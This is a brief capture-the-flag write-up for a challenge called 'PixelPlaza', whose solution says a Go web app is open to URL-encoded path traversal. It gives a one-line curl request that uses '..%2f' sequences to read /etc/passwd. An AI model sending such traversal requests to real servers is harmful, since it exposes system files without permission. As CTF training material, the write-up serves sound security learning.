# PixelPlaza

## Author
BerlianGabriel

## Description
I'm a consultant, but my client is using a new technology I'm not familiar with. Can I outsource this whitebox pentest project to you?

## Solution
main.go is vulnerable to path traversal with URL encoding.

`curl "http://host:8080/..%2f..%2f..%2f..%2fetc/passwd"` will show the /etc/passwd content. The flag file can be found by pentesting and observing the web app.
